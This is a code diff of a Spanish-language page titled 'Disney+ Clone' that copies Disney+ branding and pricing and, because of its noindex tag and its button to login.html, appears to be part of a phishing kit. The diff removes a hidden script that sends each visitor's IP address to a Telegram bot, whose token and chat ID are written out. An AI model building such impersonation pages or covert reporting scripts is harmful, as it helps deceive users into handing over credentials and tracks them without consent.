@@ -1,55 +1,28 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8"/>
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <meta name="robots" content="noindex, nofollow"/>
   <title>Disney+ Clone</title>
   <link rel="stylesheet" href="style.css"/>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap"
-        rel="stylesheet"/>
 </head>
 <body>
   <header>
     <img src="Images/compose2.png" alt="Logo Disney+" class="logo"/>
   </header>
 
-  <main class="hero">
-    <div class="overlay"></div>
-    <div class="content">
-      <h1>Clásicos imprescindibles, estrenos y Originals de Disney+.</h1>
-      <a href="information.html" class="btn">Comenzar</a>
-      <p class="subtext">
-        Desde 5,99 €/mes. Sin cargos ocultos. Sin compromiso*.<br/>
-        Disfruta 12 meses al precio de 10 con suscripción anual Premium o Standard.
-      </p>
-      <span class="footnote">
-        * La cancelación se efectúa al final del periodo de facturación actual. Suscripción requerida. 5,99 €/mes en Standard con anuncios.
-      </span>
-    </div>
+  <main>
+    <h1>Clásicos imprescindibles, estrenos y Disney+ Originals.</h1>
+    <p>Desde 5,99 €/mes. Sin cargos ocultos. Sin compromiso*.</p>
+    <button onclick="window.location.href='login.html'">Comenzar</button>
+    <p class="footnote" style="font-size:0.65rem; color:rgba(255,255,255,0.6); margin-top:8px;">
+      * La cancelación se efectúa al final del periodo de facturación actual. Suscripción requerida. 5,99 €/mes en Standard con anuncios.
+    </p>
   </main>
 
   <footer>
     <p>© 2025 Disney y sus empresas afiliadas. Todos los derechos reservados.</p>
   </footer>
-
-  <script>
-    // Notification Telegram (inchangé)
-    (function(){
-      const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
-      const chatId   = "-4970333928";
-      fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(({ ip }) => {
-          return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: chatId,
-              text: `🚀 Nuevo clic – visitante conectado con IP: ${ip}` })
-          });
-        })
-        .catch(console.warn);
-    })();
-  </script>
 </body>
 </html>
